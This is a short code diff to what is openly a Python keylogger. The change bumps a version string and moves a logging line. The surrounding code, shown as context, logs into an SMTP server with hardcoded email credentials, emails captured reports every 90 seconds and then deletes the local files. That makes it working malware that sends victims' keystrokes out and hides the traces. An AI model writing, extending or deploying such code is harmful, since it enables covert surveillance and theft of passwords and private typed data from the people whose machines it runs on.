@@ -26,7 +26,7 @@ logging.basicConfig(filename=os.path.join(log_directory, 'keylogger.log'),
                     level=logging.DEBUG,
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
-VERSION = "1.0.1"
+VERSION = "1.0.0"
 EMAIL_ADDRESS = "071bfafc4dde91"
 EMAIL_PASSWORD = "9918ecc6a25877"
 SEND_REPORT_EVERY = 90  # as in seconds
@@ -94,12 +94,13 @@ class KeyLogger:
                 server.login(email, password)
                 server.sendmail(email, email, msg.as_string())
 
+            logging.info(f"Email sent successfully with subject: {subject}")
+
             # Delete the files after sending
             if attachment_paths:
                 for attachment_path in attachment_paths:
                     if os.path.exists(attachment_path):
                         os.remove(attachment_path)
-            logging.info(f"Email sent successfully with subject: {subject}")
 
         except Exception as e:
             logging.error(f"Failed to send email: {e}")
